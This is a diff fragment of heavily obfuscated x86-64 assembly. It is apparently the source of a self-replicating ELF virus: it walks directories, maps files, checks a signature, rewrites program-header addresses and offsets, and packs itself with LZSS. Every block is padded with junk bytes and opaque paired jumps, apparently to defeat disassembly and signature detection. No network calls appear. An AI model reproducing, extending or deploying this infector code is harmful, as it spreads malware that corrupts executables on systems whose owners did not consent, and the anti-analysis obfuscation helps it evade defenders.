+..@9vHlxQj499aM:
+    mov         rax, (-1)
+    jmp         $+3
+db 0x40
+    jmp         $+5
+db 0x62, 0xe4, 0x12
+    js          ..@611tBUgINy3K
+    jns         ..@611tBUgINy3K
+..@VaG5oao5Ygbw:
+    jmp         ..@88KHKzk7iMJP
+    jl          ..@TP3zax1Pdf2L
+    jge         ..@TP3zax1Pdf2L
+..@HH4BDrotzimV:
+    cmp         r1, 0x00
+    jmp         ..@UsYOkrwrPnRL
+..@BOtHOiiC7u0U:
+    ret
+    js          GetNewProgramVaddr
+    jns         GetNewProgramVaddr
+..@mRjmRZHpQhPm:
+    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
+    jl          ..@eCQ38dTL726y
+    jge         ..@eCQ38dTL726y
+..@zlP8TzrwGrMm:
+    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
+    je          ..@t75i7PmDsrll
+    jne         ..@t75i7PmDsrll
+..@3FtceDVcgj4W:
+    mov         rax, SYS_FORK
+    js          ..@NbtSBmqxXclB
+    jns         ..@NbtSBmqxXclB
+..@MGXT1k5tio5r:
+    add         rsp, _INFDIR_OFF_size
+    jmp         $+5
+db 0x28, 0x85, 0xe7
+    jb          ..@NX9BOq6k6dD6
+    jae         ..@NX9BOq6k6dD6
+..@8OuO0U9gKJAi:
+    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
+    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
+    js          ..@7jK9ru52YNGT
+    jns         ..@7jK9ru52YNGT
+..@xdYv9PZaR2UT:
+    add         r1, 1
+    add         r2, 1
+    jb          ..@SthyxNdQc1hl
+    jae         ..@SthyxNdQc1hl
+..@fuN7j2mTKt4h:
+    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
+    jl          ..@Grjy3p8I7hHH
+    jge         ..@Grjy3p8I7hHH
+..@PoqDx0pqFdd3:
+    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
+    xor         r4, r4
+    jmp         $+5
+db 0x6e, 0xd4, 0xf6
+    jmp         $+4
+db 0x8b, 0x17
+    jl          ..@dPD0BooPh80v
+    jge         ..@dPD0BooPh80v
+..@My679AkxlRTY:
+    VAR         packed, pwd_var
+    je          ..@Pu5aY6fv4l0C
+    jne         ..@Pu5aY6fv4l0C
+..@vq7wrNrSDKxp:
+    call_vsp    Strlen
+    jmp         ..@BjS5sCIfxMKQ
+..@3rBVjVMcORPp:
+%ifdef X86_32
+    mov         esi, 0x01
+%endif
+    jmp         $+3
+db 0x69
+    js          ..@2FeOVF5N35MH
+    jns         ..@2FeOVF5N35MH
+..@ZwdwaYIz0mfE:
+    pop         r5
+    jmp         $+5
+db 0x67, 0x53, 0xec
+    jmp         $+3
+db 0x61
+    js          ..@o0erQOqCPIGN
+    jns         ..@o0erQOqCPIGN
+..@KaLksZ5wSH74:
+    cmp         r3, 0x00
+    jmp         $+5
+db 0x1d, 0xf8, 0xf1
+    je          ..@v5DUdKckfirm
+    jne         ..@v5DUdKckfirm
+..@Jz7QhAQWXp17:
+    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
     mov         BYTE [rdi], al
-    jmp         ..@vQ0VrkAdF9lJ
-..@So894saMXbsk:
-    jmp         ..@OX1iWJ3FaBHB
-    jmp         ..@uQqs81K0AI4f
+    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
+    jmp         $+3
+db 0xed
+    jl          ..@QgGokKcGlq3I
+    jge         ..@QgGokKcGlq3I
+Strcpy:
+    jmp         ..@B5eU9RZlntJj
+..@xLM2yX8Ho5Kt:
+    mov         r2, 1b
+    call        MapFile
+    cmp         rax, 0
+    jmp         $+5
+db 0x48, 0x8b, 0xd9
+    jmp         ..@7BbPjQEwPe47
+..@o0erQOqCPIGN:
+    ret
+    jmp         MemMove
+..@xgrqprr9QNjF:
+    sub         rdi, 1
+    sub         rsi, 1
+    std
+    jmp         ..@gdm0H23kuy9C
+..@JSC2ybeWasgU:
+    cmp         rax, 0
+    jmp         ..@BeckXTiHvYQ6
+..@SxuJviyzmB6d:
+    mov         rax, SYS_GETUID
+    syscall
+    jb          ..@pbjYpIfgL2ih
+    jae         ..@pbjYpIfgL2ih
+..@uOC73yUAKMYL:
+%ifdef X86_32
+    mov         ecx, original_virus_len+PADDING
+    mov         edx, 11b
+    mov         esi, 0x22
+%endif
+    jmp         ..@qhz8z9q6qBDh
+..@pfnPahA61d3X:
+    mov         QWORD [r2+p_h.p_vaddr], r3
+    jmp         $+5
+db 0xeb, 0xd8, 0x30
+    js          ..@4bFPNOvGMuoE
+    jns         ..@4bFPNOvGMuoE
+..@cBTcczWrZjgu:
+    mov         QWORD [r2+p_h.p_offset], r3
+    jmp         ..@afH8Ql8R9yLw
+..@xcJAVtwS8bU8:
+    VAR         packed, dirs_root
+    jmp         ..@FvpNHFZl78ra
+    jmp         ..@TrY8TMOOygZR
+..@UsYOkrwrPnRL:
+    jg          ..@rZ7qNVQsHsgv
+    jmp         $+3
+db 0x1a
+    jl          ..@dtIZtBn8QrJe
+    jge         ..@dtIZtBn8QrJe
+..@Fodomj5itPSF:
+    jne         ..@cS6c66HTlUaz
+    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
+    jmp         $+3
+db 0xd6
+    jb          ..@ikgPTaTG2OSC
+    jae         ..@ikgPTaTG2OSC
+..@aoon4D8YUFEz:
+    push        r2
+    jb          ..@mkescq5Qdjvs
+    jae         ..@mkescq5Qdjvs
+..@Eix5o9R89Rf4:
+    jnz         ..@Y3sATuHXbRQx
+    jmp         $+4
+db 0x24, 0x3a
+    jmp         ..@ixf5WGuQeQ27
+..@AulT9fKsgL1j:
+    mov         r1, r5
+    call        IsELFComplete
+    test        al, al
+    jmp         ..@UsVfVNYvzoOb
+..@KBiH3UqDtA00:
+    jbe         ..@PyEoMv10Zn0q
+    jl          ..@KbYcrJwYLgG3
+    jge         ..@KbYcrJwYLgG3
+..@ckEHMrJvejhn:
+    mov         ecx, signature_len
+    jmp         $+4
+db 0x57, 0x59
+    jmp         $+3
+db 0xf6
+    jmp         $+3
+db 0x88
+    jmp         $+5
+db 0x8d, 0x53, 0x4d
+    je          ..@UCOARpXYYQaV
+    jne         ..@UCOARpXYYQaV
+..@3Osun3h9m88i:
+    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
+    js          ..@cBTcczWrZjgu
+    jns         ..@cBTcczWrZjgu
+..@2rWPr1Nv0NoB:
+    ret
+    jmp         $+3
+db 0x3d
+    jmp         $+4
+db 0x04, 0xb3
+    jb          AddSizeMappedFile
+    jae         AddSizeMappedFile
+..@9UHmOqYzVIsN:
+    test        rax, rax
+    js          ..@sLwgKSYSsHZn
+    jns         ..@sLwgKSYSsHZn
+..@g4prVM2GFzA4:
+    mov         QWORD [r5+file.fileptr], 0x00
+    jb          ..@ZzVbKnpg1EWo
+    jae         ..@ZzVbKnpg1EWo
+..@qKg4vdRgo52V:
+    sub         r2, 1
+    cmp         r2, 0
+    jmp         $+5
+db 0x4e, 0xa6, 0xbe
+    jmp         ..@XaU1CGE0as4V
+..@8Pl9xDwNEDHe:
+    call_vsp    Strncmp
+    js          ..@9UHmOqYzVIsN
+    jns         ..@9UHmOqYzVIsN
+..@LHlBKxt0HAPR:
+    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
+    test        al, al
+    jnz         ..@deLH2ZVwwuI3
+    jmp         ..@NLoRyrDfFi5i
+GetNewProgramVaddr:
+    jmp         ..@Hx1DdU4nrv4F
+..@RZXLyxaffE48:
+    xor         r4, r4
+    jmp         ..@pXOpto1Nenc7
 
 _eof:
